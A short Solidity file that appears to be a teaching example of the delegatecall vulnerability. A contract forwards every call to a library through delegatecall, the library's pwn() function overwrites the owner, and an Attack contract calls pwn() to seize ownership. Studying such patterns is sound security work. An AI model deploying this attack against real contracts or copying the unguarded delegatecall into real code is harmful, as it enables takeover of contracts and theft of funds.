// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract UnsafeDelegatecall {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    // UnsafeDelegatecall owner is changed
    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract Attack {
    address public unsafeDelegatecall;

    constructor(address _unsafeDelegatecall) {
        unsafeDelegatecall = _unsafeDelegatecall;
    }

    function attack() public {
        unsafeDelegatecall.call(abi.encodeWithSignature("pwn()"));
    }
}

